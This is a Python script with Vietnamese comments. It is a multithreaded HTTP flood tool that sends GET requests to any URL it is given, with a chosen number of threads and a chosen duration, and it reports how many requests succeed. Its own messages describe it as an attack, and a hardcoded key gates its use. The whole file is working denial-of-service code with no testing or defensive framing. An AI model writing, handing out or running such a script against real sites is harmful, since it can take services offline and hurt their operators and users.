import requests
import threading
import time
import sys

# Khóa xác thực để chạy script
KHOABAOMAT = "voquocdat"

def tan_cong(url, thoi_gian, chi_so_luong, ket_qua):
    """
    Hàm thực thi trong mỗi luồng: gửi liên tục các yêu cầu GET
    cho đến khi hết thời gian quy định.
    """
    thoi_diem_ket_thuc = time.time() + thoi_gian
    dem = 0
    while time.time() < thoi_diem_ket_thuc:
        try:
            # Gửi yêu cầu với thời gian chờ 5 giây
            phan_hoi = requests.get(url, timeout=5)
            # Chỉ tính các yêu cầu thành công (mã 200)
            if phan_hoi.status_code == 200:
                dem += 1
        except:
            # Bỏ qua mọi lỗi mạng
            pass
    # Lưu số lượng yêu cầu thành công vào mảng chung
    ket_qua[chi_so_luong] = dem

def main():
    # Kiểm tra khóa: đối số dòng lệnh đầu tiên phải khớp với KHOABAOMAT
    if len(sys.argv) < 2 or sys.argv[1] != KHOABAOMAT:
        print("Sai khóa. Truy cập bị từ chối.")
        sys.exit(1)

    # Yêu cầu chính xác 5 đối số: tên script, khóa, URL, số luồng, thời gian
    if len(sys.argv) != 5:
        print("Cách dùng: python script.py <khóa> <url> <số luồng> <thời gian>")
        sys.exit(1)

    url = sys.argv[2]
    so_luong = int(sys.argv[3])
    thoi_gian = int(sys.argv[4])

    print(f"Bắt đầu tấn công vào {url} với {so_luong} luồng trong {thoi_gian} giây.")

    # Mảng lưu kết quả từng luồng
    ket_qua = [0] * so_luong
    cac_luong = []

    thoi_diem_bat_dau = time.time()
    # Tạo và khởi chạy các luồng
    for i in range(so_luong):
        luong = threading.Thread(target=tan_cong, args=(url, thoi_gian, i, ket_qua))
        luong.start()
        cac_luong.append(luong)

    # Theo dõi tiến trình thời gian thực
    try:
        while any(luong.is_alive() for luong in cac_luong):
            da_troi_qua = time.time() - thoi_diem_bat_dau
            con_lai = thoi_gian - da_troi_qua
            tong = sum(ket_qua)  # Tổng gần đúng (không đồng bộ, đơn giản)
            # In tiến trình với ký tự xuống dòng (carriage return)
            print(f"Tiến độ: {tong} yêu cầu đã gửi. Đã qua {da_troi_qua:.1f}s, còn lại {con_lai:.1f}s", end='\r')
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nTấn công bị người dùng ngắt.")
    finally:
        # Đợi tất cả luồng kết thúc
        for luong in cac_luong:
            luong.join()

    tong_yeu_cau = sum(ket_qua)
    tong_thoi_gian = time.time() - thoi_diem_bat_dau
    print(f"\nTấn công kết thúc. Tổng cộng {tong_yeu_cau} yêu cầu đã gửi trong {tong_thoi_gian:.1f} giây.")
    if tong_thoi_gian > 0:
        print(f"Tốc độ: {tong_yeu_cau/tong_thoi_gian:.2f} yêu cầu/giây.")

if __name__ == "__main__":
    main()